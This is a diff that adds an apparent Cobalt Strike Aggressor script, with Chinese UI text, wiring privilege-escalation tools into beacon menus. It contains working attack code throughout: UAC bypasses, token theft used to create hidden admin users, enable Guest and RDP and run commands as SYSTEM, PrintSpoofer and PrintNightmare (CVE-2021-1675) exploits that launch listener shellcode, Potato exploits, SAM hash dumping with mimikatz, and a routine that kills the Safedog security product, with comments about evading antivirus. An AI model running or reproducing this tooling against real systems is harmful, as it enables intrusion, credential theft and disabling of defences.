+            drow_combobox($dialog, "type", "options：", @("TrustedPathDLLHijack","SilentCleanupWinDir","SspiUac","RegistryShellCommand","CmstpElevatedCOM","ColorDataProxy","EditionUpgradeManager"));   # EXE
+            # drow_combobox($dialog, "type", "options：", @("trustedpath","silentcleanup","sspidatagram","registrycommand","elevatedcom","colordataproxy","editionupgrade"));   # BOF
+            drow_text($dialog, "program", "program：");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub UACBonanza {
+            local('$exe');
+            $exe = script_resource("bin/escalation/Bypassuac/UACBonanza/" . "$3['type']" . ".exe");
+            btask($bid, "Tasked beacon upload and run: $3['type']");
+            bupload!($bid, $exe);
+            fireAlias($bid, "sharpcmd", "\"$3['type'] $3['program']\"");    #EXE
+            # fireAlias($bid, "$3['type']", "$3['program']");   # BOF
+            # https://github.com/icyguider/UAC-BOF-Bonanza
+            # 这个项目的BOF在CobaltStrike中执行有些问题，需要修改，有空再弄。
+        }
+        item "COMBypassUAC" {
+            $bid = $1['@'];
+            $dialog = dialog("COMBypassUAC", %(program => "C:\\\\Windows\\\\System32\\\\calc.exe",bid => $bid), &COMBypassUAC);
+            dialog_description($dialog, "通过CMLuaUtil COM接口绕过UAC，只需指定要运行的免杀PE文件即可，360核晶模式下不会拦截。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win11"));
+            drow_combobox($dialog, "method", "method：", @("ICMLuaUtil[DLL]","ICMLuaUtil[BOF]"));
+            drow_text($dialog, "program", "program：");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub COMBypassUAC {
+            btask($bid, "Type: Elevated COM interface");
+            btask($bid, "Method: $3['method']");
+
+            if ($3['method'] eq "ICMLuaUtil[DLL]") {
+                if (barch($bid)=="x64") {
+                    btask($bid, "Arch is: " .barch($3['bid']));
+                    bdllspawn($bid, script_resource("bin/escalation/Bypassuac/comBypassUac.x64.dll"), $3['program'], "comBypassUac", 5000, false);
+                } else {
+                    btask($bid, "Arch is: " .barch($3['bid']));
+                    bdllspawn($bid, script_resource("bin/escalation/Bypassuac/comBypassUac.dll"), $3['program'], "comBypassUac", 5000, false);
+                    # https://github.com/9bie/Slacker/tree/master/bin/Privilege_escalation/COMBypassUAC
+                }
+            } else {
+                fireAlias($bid, "uac_bypass_cmstplua", "$3['program']");
+                # https://github.com/tijme/cmstplua-uac-bypass
+            }
+        }
+        item "SharpBypassUAC" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpBypassUAC", %(cmd => "Y2FsYw==",type => "fodhelper",bid => $bid), &SharpBypassUAC);
+            dialog_description($dialog, "UAC绕过技术集合，命令需Base64编码，DiskCleanup必须以“&& REM”结尾，如：calc.exe && REM");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win11"));
+            drow_combobox($dialog, "type", "options：", @("fodhelper","eventvwr","computerdefaults","sdclt","slui","diskcleanup"));
+            drow_combobox($dialog, "execute", "execute：", @("execute-assembly","inlineExecute-Assembly"));
+            drow_text($dialog, "cmd", "command：");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub SharpBypassUAC {
+            local('$exe $arg');
+            $exe = script_resource("bin/escalation/Bypassuac/SharpBypassUAC.exe");
+            $arg = join(' ', @("-b",$3['type'],"-e",$3['cmd']));
+
+            if ($3['execute'] eq "execute-assembly") {
+                bexecute_assembly($bid, $exe, $arg);
+                # https://github.com/FatRodzianko/SharpBypassUAC
+            } else {
+                blog($bid, "Use SharpBypassUAC.exe $arg");
+                fireAlias($bid, "PatchlessinlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs $arg");
+            }
+        }
+    }
+
+    menu "SharpToken" {
+        $SharpToken = script_resource("bin/escalation/SharpToken.exe");
+        # https://github.com/BeichenDream/SharpToken
+
+        item "list_token" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpToken - list_token/list_all_token",%(pid => "", bid => $bid),&list_token);
+            dialog_description($dialog, "list_token可用令牌，list_all_token所有令牌，pid为空时查询所有进程令牌，否则查询指定pid的令牌。");
+            drow_combobox($dialog, "arguments", "arguments: ", @("list_token","list_all_token"));
+            drow_text($dialog, "pid", "process pid: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub list_token {
+            if ($3['pid'] eq "") {
+                bexecute_assembly($bid, $SharpToken, "$3['arguments'] bypass");
+            } else {
+                bexecute_assembly($bid, $SharpToken, "$3['arguments'] $3['pid'] bypass");
+            }
+        }
+        item "add/del_user" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpToken - add/delete_user",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", group => "Administrators", bid => $bid),&adddeluser);
+            dialog_description($dialog, "使用盗取的Token创建管理员用户和删除具有被盗令牌的用户，删除用户时只需填写用户即可。");
+            drow_combobox($dialog, "arguments", "arguments: ", @("add_user","delete_user"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            drow_text($dialog, "group", "groupname: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub adddeluser {
+            if ($3['arguments'] eq "add_user") {
+                bexecute_assembly($bid, $SharpToken, "add_user $3['user'] $3['pass'] $3['group'] bypass");
+            } else {
+                bexecute_assembly($bid, $SharpToken, "delete_user $3['user'] bypass");
+            }
+        }
+        item "enableUser" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpToken - enableUser",%(user => "Guest1", pass => "P@ssw0rd!@#", group => "Administrators", bid => $bid),&enableUser);
+            dialog_description($dialog, "使用盗取的Token启用Guest来宾用户并设置密码和加入administrators管理组。");
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            drow_text($dialog, "group", "groupname: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub enableUser {
+            bexecute_assembly($bid, $SharpToken, "enableUser $3['user'] $3['pass'] $3['group'] bypass");
+        }
+        item "execute" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpToken - execute",%(token => "NT AUTHORITY\\SYSTEM", command => "whoami", bid => $bid),&execute);
+            dialog_description($dialog, "使用窃取的令牌执行命令并获取结果，也可以在webshell下使用，cmd true可获取交互式shell。");
+            drow_text($dialog, "token", "token: ");
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub execute {
+            bexecute_assembly($bid, $SharpToken, "execute \"$3['token']\" \"cmd /c $3['command']\" bypass");
+        }
+        item "enableRDP" {
+            bexecute_assembly($1, $SharpToken, "enableRDP bypass");
+        }
+        item "tscon" {
+            $bid = $1['@'];
+            $dialog = dialog("SharpToken - tscon",%(target => "1", source => "2", bid => $bid),&tscon);
+            dialog_description($dialog, "使用盗取的Token切换到目标桌面，其中1是目标用户的桌面，2是我们想要接收的桌面。");
+            drow_text($dialog, "target", "targetSessionId: ");
+            drow_text($dialog, "source", "sourceSessionId: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub tscon {
+            bexecute_assembly($bid, $SharpToken, "tscon $3['target'] $3['source'] bypass");
+        }
+    }
+
+    item "SpoolSystem" {
+        $bid = $1['@'];
+        $dialog = dialog("SpoolSystem",%(bid => $bid),&SpoolSystem1);
+        dialog_description($dialog, "使用Print Spooler命名管道模拟技巧来获取SYSTEM权限，无需创建任何新进程或依赖跨进程shellcode注入，实战中Win10、2k16/19/22均可成功。");
+        drow_combobox($dialog, "version", "support: ", @("Win10/Win2k16/2019/2022"));
+        drow_combobox($dialog, "mode", "mode: ", @("selfinject","spawn"));
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub SpoolSystem1 {
+        fireAlias($bid, "spoolsystem", $3['mode']);
+        bgetuid($bid);
+        # https://github.com/rxwx/spoolsystem
+    }
+
+    item "PrintSpoofer" {
+        $bid = $1['@'];
+        $dialog = dialog("PrintSpoofer",%(bid => $bid),&PrintSpoofer);
+        dialog_description($dialog, "CVE-2021-34527，通过Print Spooler打印机服务和滥用SeImpersonatePrivilege获取SYSTEM权限，本地Win10、2k12/19/22均可成功，Win11和2k16失败。");
+        drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2016/2019/2022"));
+        drow_listener($dialog, "listener", "listener: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub PrintSpoofer {          # Win2k16本地复现失败，但有朋友实战成功过
+        local('$arch $dll $stager');
+        btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via PrintSpoofer");
+    
+        if (-is64 $bid)
+        {
+            $arch = "x64";
+            $dll = script_resource("bin/escalation/PrintSpoofer.x64.dll");
+        } else {
+            $arch = "x86";
+            $dll = script_resource("bin/escalation/PrintSpoofer.x86.dll");
+        }
+        $stager = shellcode($3['listener'], false, $arch);
+        bdllspawn!($bid, $dll, $stager, "PrintSpoofer", 5000);
+        beacon_link($bid, $null, $3['listener']);
+        # https://github.com/crisprss/PrintSpoofer
+    }
+
+    item "PrintNightmare" {
+        $bid = $1['@'];
+        $dialog = dialog("PrintNightmare",%(bid => $bid),&PrintNightmare);
+        dialog_description($dialog, "CVE-2021-1675的另一个exp(稳定)，可支持Win10/2k16/2019和自定义dll执行，返回0为利用成功，返回Invoke_3 on EntryPoint failed为Spooler服务停止（不可利用）。");
+        drow_listener($dialog, "listener", "listener: ");
+        drow_combobox($dialog, "version", "support: ", @("Win10/Win2k16/2019"));
+        drow_combobox($dialog, "options", "options: ", @("shellcode","customdll"));
+        drow_file($dialog, "dllfile", "updllfile: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub PrintNightmare {
+        local('$temp $exe $payload');
+        $temp = "C:\\Windows\\System32\\spool\\drivers\\color\\" . Getname() . ".dll";
+        $exe = script_resource("bin/escalation/PrintNightmare.exe");
+
+        if ($3['options'] eq "shellcode") {
+            btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2021-1675");
+            blog($bid, "=========CVE-2021-1675 exploits elevate=============");
+            $payload = artifact_payload($3['listener'], "dll", barch($bid));
+            bupload_raw!($bid, $temp, $payload);
+            btask($bid, "Stageless uploading to: $temp");
+            bexecute_assembly($bid, $exe, "$temp");
+            blog($bid, "Manual deletion: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\*.dll");
+        }  else {
+            btask($bid, "Tasked beacon run: CVE-2021-1675 [Custom DLL Path]");
+            blog($bid, "=========CVE-2021-1675 exploits elevate=============");
+            blog($bid, "AddUser.dll Username: admin, Password: Passw0rd!");
+            blog($bid, "Manual deletion: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\*.dll");
+            fireAlias($bid, "upload", "$3['dllfile'] $temp");
+            bexecute_assembly($bid, $exe, "$temp");
+            # brm!($bid, $temp);  # 删除上传的dll文件，执行会注入到spoolsv.exe进程
+            # https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare
+        }
+    }
+
+    item "ElevateSystem" {
+        local('$bid');
+        foreach $bid ($1) {
+            ElevateSystem($bid);
+        }
+    }
+    sub ElevateSystem {
+        local('$handle $data');
+        btask($1, "Use the SetThreadToken API to raise the current beacon to SYSTEM");
+	    $handle = openf(script_resource("bin/escalation/elevate_x64.o"));    #仅支持64位进程
+	    $data   = readb($handle, -1);
+	    closef($handle);
+	    beacon_inline_execute($1, $data, "go");
+        # https://github.com/Mr-Un1k0d3r/Elevate-System-Trusted-BOF
+    }
+
+    item "SAMDumpHash" {
+        $bid = $1['@'];
+        $dialog = dialog("SAMDumpHash",%(bid => $bid),&SAMDumpHash);
+        dialog_description($dialog, "需Users用户组具备SAM注册表读取权限，建议用MSF下的：post/windows/gather/hashdump");
+        drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+        drow_combobox($dialog, "type", "options: ", @("Query SAM Privs","Mimikatz SAM Hash"));
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub SAMDumpHash {
+        if ($3['type'] eq "Query SAM Privs") {
+            bpowerpick($bid, "Get-Acl -Path HKLM:\\SAM\\SAM | Format-List");
+        } else {
+            bmimikatz($bid, "lsadump::sam");
+        }
+    }
+
+    item "KillSafedogGuard" {
+        btask($1, "Uploading the killallsafedog, please wait...!");
+        bupload!($1, script_resource("bin/escalation/KillSafedog/killallsafedog-a.txt"));
+        bupload!($1, script_resource("bin/escalation/KillSafedog/killallsafedog-b.txt"));
+        bupload!($1, script_resource("bin/escalation/KillSafedog/killallsafedog-c.txt"));
+        bupload!($1, script_resource("bin/escalation/KillSafedog/killallsafedog.bat"));
+        bshell($1, "killallsafedog.bat");
+        bshell($1, "del /f /q killallsafedog*.*");
+    }
+
+    item "InlineExecute[.NET]" {
+        $bid = $1['@'];
+        $dialog = dialog("InlineExecute[.NET]",%(args => "whoami",bid => $bid),&InlineExecute);
+        dialog_description($dialog, "≤CS4.5无法使用，InlineExecute-Assembly操作安全[OPSEC]要比execute-assembly好很多，但不太稳定，有时在执行后可能会导致信标被杀死，无法再执行其他.NET程序...。");
+        drow_combobox($dialog, "exps", "常用NET土豆:", @("Custom-.Net","BadPotato","EfsPotato","GodPotato","DeadPotato","SweetPotato","SigmaPotato","PrintNotifyPotato","PrinterNotifyPotato","McpManagementPotato"));
+        drow_file($dialog, "dotnet", "要运行的NET:");
+        drow_text($dialog, "args", "运行NET参数:");
+        drow_checkbox($dialog, "amsi", "使用AMSI参数:", "--amsi(≥Win10/2k16)");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub InlineExecute {
+        local('$exe');
+        btask($bid, "Tasked beacon to run .NET program: $3['exps']");
+        $exe = script_resource("bin/escalation/PotatoExps/ $+ $3['exps'] $+ .exe");
+        # https://github.com/anthemtotheego/InlineExecute-Assembly
+        # https://github.com/VoldeSec/PatchlessInlineExecute-Assembly
+
+        if ($3['amsi'] eq "true") {
+            if ($3['exps'] eq "Custom-.Net") {
+                if ($3['dotnet'] eq "") {
+                    berror($bid, "Please choose one NET program");
+                    return;
+                } else {
+                    fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $3['dotnet'] --assemblyargs \"$3['args']\" --amsi");
+                }
+            }
+            if ($3['exps'] eq "EfsPotato") {        # 部分Win10/Win2k22可能会报错5，可尝试使用线程土豆进行提权
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs \"$3['args']\" lsarpc --amsi");
+            }
+            if ($3['exps'] eq "SweetPotato") {      # Win10/Win2K16执行命令经常掉线，可尝试在args直接指定CS免杀马！
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs -c 4991D34B-80A1-4291-83B6-3328366B9097 -a \"$3['args']\" --amsi");
+            }
+            if ($3['exps'] eq "GodPotato" || $3['exps'] eq "DeadPotato") {
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs -cmd \"$3['args']\" --amsi");
+            }
+            if ($3['exps'] eq "BadPotato" || $3['exps'] eq "SigmaPotato" || $3['exps'] eq "PrintNotifyPotato" || $3['exps'] eq "PrinterNotifyPotato" || $3['exps'] eq "McpManagementPotato") {
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs \"$3['args']\" --amsi");
+            }
+        } else {
+            if ($3['exps'] eq "Custom-.Net") {
+                if ($3['dotnet'] eq "") {
+                    berror($bid, "Please choose one NET program");
+                    return;
+                } else {
+                    fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $3['dotnet'] --assemblyargs \"$3['args']\"");
+                }
+            }
+            if ($3['exps'] eq "EfsPotato") {        # 部分Win10/Win2k22可能会报错5，可尝试使用线程土豆进行提权
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs \"$3['args']\" lsarpc");
+            }
+            if ($3['exps'] eq "SweetPotato") {      # Win10/Win2K16执行命令经常掉线，可尝试在args直接指定CS免杀马！
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs -c 4991D34B-80A1-4291-83B6-3328366B9097 -a \"$3['args']\"");
+            }
+            if ($3['exps'] eq "GodPotato" || $3['exps'] eq "DeadPotato") {
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs -cmd \"$3['args']\"");
+            }
+            if ($3['exps'] eq "BadPotato" || $3['exps'] eq "SigmaPotato" || $3['exps'] eq "PrintNotifyPotato" || $3['exps'] eq "PrinterNotifyPotato" || $3['exps'] eq "McpManagementPotato") {
+                fireAlias($bid, "inlineExecute-Assembly", "--dotnetassembly $exe --assemblyargs \"$3['args']\"");
+            }
+        }
+    }
+    include(script_resource("bin/escalation/BOFRunPortable.cna"));     # 加载BOF内存运行EXE插件
+    # https://github.com/9bie/Slacker/blob/master/modules/BOFRunPortable.cna
+
+    sub Getname {
+        local('$fname');
+        $fname = "";
+        @array = @("a", "b", "c", "d", "e", "f", "g", "h", "i" ,"0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+        $total = 12;
+        while($total >= 0){
+            $fname = $fname.rand(@array);
+            $total = $total - 1;
+        }
+        return $fname;
+    }
+
+}
